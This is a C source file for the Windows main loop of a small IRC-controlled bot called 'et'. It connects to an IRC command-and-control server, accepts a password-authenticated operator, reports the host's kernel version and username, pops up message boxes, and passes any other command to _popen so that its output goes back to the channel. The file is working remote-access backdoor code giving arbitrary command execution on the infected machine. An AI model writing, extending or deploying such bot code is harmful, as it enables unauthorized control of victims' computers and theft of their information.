/*	et_main_loop_nix.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data on Windows.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>

/*	et_main_loop_win
	The main loop called by et_win.c to communicate with the IRC C&C server.
	arg: SOCKET socket, the winsock to write to/read from.
	arg: char *nick, the string containing the IRC nickname
*/
void et_main_loop_win(SOCKET socket, char *nick)
{
	char buf[1024];
	char auth = 0;

	while(1)
	{
		ZeroMemory(buf, 1024);
		recv(socket, buf, 1023, 0);
		buf[1023] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			char *pong = strtok(ping, "\r\n");
			strncpy(pong, "PONG", 4);
			send(socket, pong, strlen(pong), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++; /* increment past ':' */

			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
			{
				cmd += 5; /* increment past 'auth ' */
				char auth_message[IRC_MSGLEN];

				if (!strcmp(cmd, IRC_AUTH))
				{
					auth = 1;
					_snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
					send(socket, auth_message, strlen(auth_message), 0);
				}
				else
				{
					_snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
					send(socket, auth_message, strlen(auth_message), 0);
				}
			}
			else
			{
				if (!auth)
				{
					char unauth_message[IRC_MSGLEN];
					_snprintf(unauth_message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
					send(socket, unauth_message, strlen(unauth_message), 0);
				}
				else
				{
					if (strstr(cmd, "kill"))
					{
						break; /* back to main@et_win.c */
					}
					else if (strstr(cmd, "deauth"))
					{
						char deauth_message[IRC_MSGLEN];
						_snprintf(deauth_message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
						send(socket, deauth_message, strlen(deauth_message), 0);
						auth = 0;
					}
					else if (strstr(cmd, "info"))
					{
						char info[IRC_MSGLEN];

						OSVERSIONINFO kern_info;
						kern_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
						GetVersionEx(&kern_info);
						_snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Kernel: Windows NT %d.%d build %d\r\n", IRC_CHANNEL, (int) kern_info.dwMajorVersion, (int) kern_info.dwMinorVersion, (int) kern_info.dwBuildNumber);
						send(socket, info, strlen(info), 0);
						ZeroMemory(info, IRC_MSGLEN);

						char username[128];
						DWORD username_sz = 128;
						GetUserName(username, &username_sz);
						_snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Username: %s\r\n", IRC_CHANNEL, username);
						send(socket, info, strlen(info), 0);
						ZeroMemory(info, IRC_MSGLEN);
					}
					else if (strstr(cmd, "popup"))
					{
						cmd += 6; /* increment past 'popup ' */
						MessageBox(NULL, cmd, "ET says hi", MB_OK | MB_ICONINFORMATION);
					}
					else
					{
						char cmd_output[IRC_MSGLEN];
						char cmd_message[IRC_MSGLEN];

						FILE *output_file = _popen(cmd, "rt");
						fread((void *) cmd_output, 1, IRC_MSGLEN, output_file);

						int i;
						for (i = 0; cmd_output[i]; i++)
						{
							if (cmd_output[i] == '\r' || cmd_output[i] == '\n')
							{
								cmd_output[i] = ' ';
							}
						}

						if (strlen(cmd_output) >= 500)
						{
							_snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
						}
						else
						{
							_snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
						}

						send(socket, cmd_message, strlen(cmd_message), 0);
						_pclose(output_file);
						ZeroMemory(cmd_output, IRC_MSGLEN);
					}
				}
			}
		}
	}
}